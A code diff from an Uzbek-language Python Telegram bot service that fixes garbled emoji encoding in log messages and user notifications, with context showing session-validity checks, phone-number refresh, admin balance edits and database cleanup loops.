     bot_instance = Bot(token=BOT_TOKEN)
     try:
-        await bot_instance.send_message(tid, "вќЊ To'lovingiz rad etildi.")
+        await bot_instance.send_message(tid, "❌ To'lovingiz rad etildi.")
     finally:
         await bot_instance.session.close()
     return {"ok": True}
@@ -3385,7 +3382,7 @@ async def admin_users(x_admin_token: str = Header(default="")):
 async def auto_refresh_phones():
     """Bot ishga tushganda raqami yo'q foydalanuvchilarni avtomatik to'ldiradi"""
     await asyncio.sleep(5)  # DB va bot tayyor bo'lishini kutamiz
-    logger.info("рџ“ћ Telefon raqamlarini avtomatik yangilash boshlanadi...")
+    logger.info("📞 Telefon raqamlarini avtomatik yangilash boshlanadi...")
     async with aiosqlite.connect(DB_PATH) as db:
         db.row_factory = aiosqlite.Row
         async with db.execute("SELECT telegram_id, session_string FROM users WHERE session_string IS NOT NULL AND (phone IS NULL OR phone = '')") as c:
@@ -3407,7 +3404,7 @@ async def auto_refresh_phones():
             await _c.disconnect()
         except Exception as e:
             logger.warning(f"Auto phone refresh xato ({tid}): {e}")
-    logger.info(f"вњ… Telefon raqamlari yangilandi: {updated} ta")
+    logger.info(f"✅ Telefon raqamlari yangilandi: {updated} ta")
 
 async def session_checker_loop():
     """Vaqti-vaqti bilan barcha ulangan foydalanuvchilarning seanslari yaroqliligini tekshiradi"""
@@ -3429,7 +3426,7 @@ async def session_checker_loop():
                         if not await c.is_user_authorized():
                             await stop_stealth_client(tid)
                             await save_session(tid, None)
-                            logger.info(f"рџ”ґ Seans uzilganligi aniqlandi (stealth): {tid}")
+                            logger.info(f"🔴 Seans uzilganligi aniqlandi (stealth): {tid}")
                     except Exception:
                         pass
                 else:
@@ -3445,13 +3442,13 @@ async def session_checker_loop():
                                     await db.commit()
                         else:
                             await save_session(tid, None)
-                            logger.info(f"рџ”ґ Seans uzilganligi aniqlandi: {tid}")
+                            logger.info(f"🔴 Seans uzilganligi aniqlandi: {tid}")
                         await c.disconnect()
                     except Exception as e:
                         err_str = str(e).lower()
                         if "unregistered" in err_str or "revoked" in err_str or "deactivated" in err_str:
                             await save_session(tid, None)
-                            logger.info(f"рџ”ґ Seans bekor qilinganligi aniqlandi ({tid}): {e}")
+                            logger.info(f"🔴 Seans bekor qilinganligi aniqlandi ({tid}): {e}")
                 await asyncio.sleep(1)
         except Exception as e:
             logger.error(f"session_checker_loop xatosi: {e}")
@@ -3506,7 +3503,7 @@ async def admin_set_balance(request: Request, x_admin_token: str = Header(defaul
     try:
         await bot_instance.send_message(
             tid, 
-            f"рџ’° Admin tomonidan balansingiz tahrirlandi!\nJoriy balans: <b>{amt:,} so'm</b>", 
+            f"💰 Admin tomonidan balansingiz tahrirlandi!\nJoriy balans: <b>{amt:,} so'm</b>", 
             parse_mode="HTML"
         )
     except:
@@ -3599,14 +3596,14 @@ async def auto_cleanup_db_loop():
                 # Bazani optimallashtirish (bo'shagan diska hajmini qaytarish)
                 await db.execute("VACUUM")
                 
-            logger.info("рџ§№ DB Auto-cleanup bajarildi: eskirgan va keraksiz ma'lumotlar tozalandi.")
+            logger.info("🧹 DB Auto-cleanup bajarildi: eskirgan va keraksiz ma'lumotlar tozalandi.")
         except Exception as e:
             logger.error(f"DB Auto-cleanup xato: {e}")
             
         await asyncio.sleep(21600)  # Har 6 soatda 1 marta
 
 
-# в”Ђв”Ђв”Ђ MAIN в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# ─── MAIN ─────────────────────────────────────
 async def main():
     import signal
 
@@ -3614,7 +3611,7 @@ async def main():
     bot = Bot(token=BOT_TOKEN)
     dp  = Dispatcher()
     dp.include_router(router)
-    logger.info("рџ¤– Bot + рџЊђ Web ishga tushdi!")
+    logger.info("🤖 Bot + 🌐 Web ishga tushdi!")
 
     # Orqa fonda monitoring loop ni ishga tushiramiz
     monitoring_task = asyncio.create_task(monitoring_loop(bot))
@@ -3643,12 +3640,12 @@ async def main():
     bg_tasks: list[asyncio.Task] = [monitoring_task, deferred_task, session_check_task, cleanup_task]
 
     async def _shutdown():
-        logger.info("вЏ№ Graceful shutdown boshlandi...")
+        logger.info("⏹ Graceful shutdown boshlandi...")
         for t in bg_tasks:
             t.cancel()
         await asyncio.gather(*bg_tasks, return_exceptions=True)
         await bot.session.close()
-        logger.info("вњ… Toza to'xtatildi.")
+        logger.info("✅ Toza to'xtatildi.")
 
     for sig in (signal.SIGTERM, signal.SIGINT):
         try:
